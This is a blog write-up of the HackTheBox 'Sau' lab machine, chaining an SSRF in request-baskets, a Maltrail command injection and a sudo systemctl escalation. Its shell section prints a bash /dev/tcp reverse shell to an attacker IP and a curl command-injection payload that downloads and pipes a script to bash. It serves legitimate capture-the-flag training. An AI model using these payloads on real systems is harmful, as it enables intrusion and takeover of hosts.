<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="HackTheBox-Sau Walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="Description : Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges." /><meta property="og:description" content="Description : Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges." /><link rel="canonical" href="/posts/HackTheBox-Sau/" /><meta property="og:url" content="/posts/HackTheBox-Sau/" /><meta property="og:site_name" content="Mostafa Toumi" /><meta property="og:image" content="/assets/img/favicons/HackTheBox/Sau/Sau.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-12-29T14:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/favicons/HackTheBox/Sau/Sau.png" /><meta property="twitter:title" content="HackTheBox-Sau Walkthrough" /><meta name="twitter:site" content="@EmSec0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-01-06T14:54:44+01:00","datePublished":"2023-12-29T14:00:00+01:00","description":"Description : Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges.","headline":"HackTheBox-Sau Walkthrough","image":"/assets/img/favicons/HackTheBox/Sau/Sau.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HackTheBox-Sau/"},"url":"/posts/HackTheBox-Sau/"}</script><title>HackTheBox-Sau Walkthrough | Mostafa Toumi</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mostafa Toumi"><meta name="application-name" content="Mostafa Toumi"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/Mostafatoumi/mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/emsec_1.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Mostafa Toumi</a></div><div class="site-subtitle font-italic">Computer Networking Specialist | Penetration Tester | CTF Player</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Mostafatoumi" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/EmSec0" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['Mostafatoumi0','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/962022" aria-label="hackthebox" target="_blank" rel="noopener noreferrer"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/mostafatoumi/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox-Sau Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox-Sau Walkthrough</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1703854800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 29, 2023 </em> </span> <span> Updated <em class="" data-ts="1704549284" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 6, 2024 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/favicons/HackTheBox/Sau/Sau.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'%3E%3C/svg%3E" data-src="/assets/img/favicons/HackTheBox/Sau/Sau.png" alt="Preview Image" width="1200" height="630" class="lazyload" data-proofer-ignore></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/EmSec0">Mostafa Toumi</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="710 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h1 id="description-">Description :</h1><p>Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges.</p><h2 id="nmap-"><span class="mr-2">Nmap :</span><a href="#nmap-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Upon scanning the host’s ports, we identified two open ports: 22 and 5555 :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre> /opt/nmapAutomator/nmapAutomator.sh <span class="nt">-t</span> All <span class="nt">-H</span> 10.10.11.224 

Running all scans on 10.10.11.224

Host is likely running Linux


<span class="nt">---------------------Starting</span> Port Scan-----------------------



PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown



<span class="nt">---------------------Starting</span> Script Scan-----------------------



PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 29 Dec 2023 13:52:51 GMT
|     Content-Length: 75
|     invalid basket name<span class="p">;</span> the name does not match pattern: ^[wd-_<span class="se">\.</span><span class="o">]{</span>1,250<span class="o">}</span><span class="err">$</span>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Location: /web
|     Date: Fri, 29 Dec 2023 13:52:24 GMT
|     Content-Length: 27
|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 29 Dec 2023 13:52:24 GMT
|_    Content-Length: 0
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

</pre></table></code></div></div><h2 id="tcp---port-5555"><span class="mr-2">TCP - PORT 5555</span><a href="#tcp---port-5555" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong><em>About Request Baskets :Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI. It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.</em></strong></p><p>We can create a basket with name choice , in this case <code class="language-plaintext highlighter-rouge">emsec</code> : <a href="/assets/img/favicons/HackTheBox/Sau/web_basket_01.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_01.png" alt="Alt text" class="lazyload" data-proofer-ignore></a> <a href="/assets/img/favicons/HackTheBox/Sau/web_basket_02.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_02.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_03.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_03.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>Now, our basket is prepared and awaits incoming requests:</p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_04.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_04.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>if we try to send requests to http://10.10.11.224:55555/emsec it will apear on <code class="language-plaintext highlighter-rouge">Request Baskets</code> :</p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_05.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_05.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>also there is a parameters that we can modify :</p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_06.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_06.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><h2 id="cve-2023-27163--ssrf"><span class="mr-2">CVE-2023-27163 | SSRF:</span><a href="#cve-2023-27163--ssrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>By examining the website version</p><p><a href="/assets/img/favicons/HackTheBox/Sau/vulnerable_version.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/vulnerable_version.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>I searched on Google for vulnerabilities in the <code class="language-plaintext highlighter-rouge">request-baskets Version: 1.2.1</code> and discovered the associated steps on GitHub under<a href="https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">CVE-2023-27163 </a></p><p>Having identified the SSRF on the website, by implementing this modification, we can exploit it.</p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_07.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_07.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>revisiting the <code class="language-plaintext highlighter-rouge">/emsec</code> basket : <a href="/assets/img/favicons/HackTheBox/Sau/web_basket_08.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_08.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>We successfully exploited the SSRF; it is now functioning as intended.</p><h2 id="os-command-injection-on-maltrail-"><span class="mr-2">OS Command Injection on Maltrail :</span><a href="#os-command-injection-on-maltrail-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong><em>what is Maltrail : <a href="https://github.com/stamparm/maltrail/blob/master/README.md#introduction">Maltrail</a> is a malicious traffic detection system</em></strong></p><p>Upon inspecting the bottom, we can identify the version of Maltrail. After searching for its vulnerability on Google, we came across a post regarding <a href="https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">Unauthenticated OS Command Injection</a>.</p><p>Now, let’s proceed. Firstly, change the <code class="language-plaintext highlighter-rouge">Forward URL:</code> to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:80/login</code>:</p><p><a href="/assets/img/favicons/HackTheBox/Sau/web_basket_09.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/web_basket_09.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>After executing the injection, we received the callback, confirming the successful functioning of the OS command :</p><p><a href="/assets/img/favicons/HackTheBox/Sau/shell.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/shell.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><h2 id="shell-as-puma"><span class="mr-2">Shell as puma:</span><a href="#shell-as-puma" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>create your reversesehll and strat the http.server:</p><ul><li>reverse shell :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>emsec㉿emsec-pc<span class="o">)</span>-[~]
└─<span class="nv">$ </span><span class="nb">cat </span>shell.sh 
<span class="c">#!/bin/bash</span>
bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.81/4444 0&gt;&amp;1"</span>
</pre></table></code></div></div><ul><li>payload :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s1">'http://10.10.11.224:55555/emsec'</span> <span class="se">\</span>
  <span class="nt">--data</span> <span class="s2">"username=;'curl http://10.10.14.81/shell.sh|bash'"</span>
</pre></table></code></div></div><ul><li>Upgrading Shell to Fully Interactive TTYs :</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>

CTR+Z

<span class="nb">stty</span> <span class="nt">-echo</span> raw<span class="p">;</span><span class="nb">fg</span>

</pre></table></code></div></div><p>and then reading the user falg :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>puma@sau:/opt/maltrail<span class="nv">$ </span><span class="nb">cd</span> /home/puma/
puma@sau:~<span class="nv">$ </span><span class="nb">ls
</span>user.txt
puma@sau:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
d19b35b25e4df14c10326b<span class="k">***********</span>
</pre></table></code></div></div><h2 id="shell-as-root-"><span class="mr-2">Shell as root :</span><a href="#shell-as-root-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Upon inspecting the privileges of the current Puma user using <code class="language-plaintext highlighter-rouge">sudo -l</code>, we discovered the capability to execute <code class="language-plaintext highlighter-rouge">/usr/bin/systemctl status trail.service</code> with root permissions.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>puma@sau:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puma on sau:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User puma may run the following commands on sau:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
</pre></table></code></div></div><p>It appears to be a straightforward privilege escalation. We can easily chack <a href="https://gtfobins.github.io/gtfobins/systemctl/#sudo">GTFOBins</a></p><p><a href="/assets/img/favicons/HackTheBox/Sau/gtfobins.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/gtfobins.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>Get root by just running</p><p><code class="language-plaintext highlighter-rouge">sudo /usr/bin/systemctl status trail.service</code> then <code class="language-plaintext highlighter-rouge">!sh</code></p><p><a href="/assets/img/favicons/HackTheBox/Sau/root.png" class="popup img-link "><img data-src="/assets/img/favicons/HackTheBox/Sau/root.png" alt="Alt text" class="lazyload" data-proofer-ignore></a></p><p>I hope you enjoyed my write-up.</p><p><a href="https://github.com/Mostafatoumi/mostafatoumi.github.io/blob/main/assets/img/favicons/HackTheBox/emsec_4.gif" class="popup img-link "><img data-src="https://github.com/Mostafatoumi/mostafatoumi.github.io/blob/main/assets/img/favicons/HackTheBox/emsec_4.gif" alt="" class="lazyload" data-proofer-ignore></a></p><p>Happy hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthrough/'>HackTheBox Walkthrough</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox-Sau%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sau%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox-Sau%20Walkthrough%20-%20Mostafa%20Toumi&u=%2Fposts%2FHackTheBox-Sau%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FHackTheBox-Sau%2F&text=HackTheBox-Sau%20Walkthrough%20-%20Mostafa%20Toumi" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=%2Fposts%2FHackTheBox-Sau%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=HackTheBox-Sau%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sau%2F" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/LDAP/">LDAP Lightweight Directory Access Protocol</a><li><a href="/posts/HackTheBox-Sau/">HackTheBox-Sau Walkthrough</a><li><a href="/posts/DNS/">DNS Domain Name System</a><li><a href="/posts/ActiveDirectory_Management_with_Powershell/">Active Directory Management - A PowerShell Journey</a><li><a href="/posts/ADDC-LAB-PART_01/">Active Directory Mastery - A Guide to Windows Server Setup for Penetration Testing</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-Sekhmet_/"><div class="card-body"> <em class="small" data-ts="1680091200" data-df="ll" > Mar 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sekhmet Walkthrough</h3><div class="text-muted small"><p> Hello everyone, This is EmSec, and I&#39;m excited to share my experience of solving the Sekhmet machine from HackTheBox. As an enthusiast of cybersecurity, I&#39;ve been exploring various hacking chal...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Derailed/"><div class="card-body"> <em class="small" data-ts="1689854400" data-df="ll" > Jul 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Derailed Walkthrough</h3><div class="text-muted small"><p> Box Info Derailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, an...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Sandworm/"><div class="card-body"> <em class="small" data-ts="1700308800" data-df="ll" > Nov 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sandworm Walkthrough</h3><div class="text-muted small"><p> Description : Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HackTheBox-Sandworm/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox-Sandworm Walkthrough</p></a> <a href="/posts/LDAP3_ADDC/" class="btn btn-outline-primary" prompt="Newer"><p>A Hands-On Guide to Active Directory Enumeration and Modification with ldap3</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/EmSec0">Mostafa Toumi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script 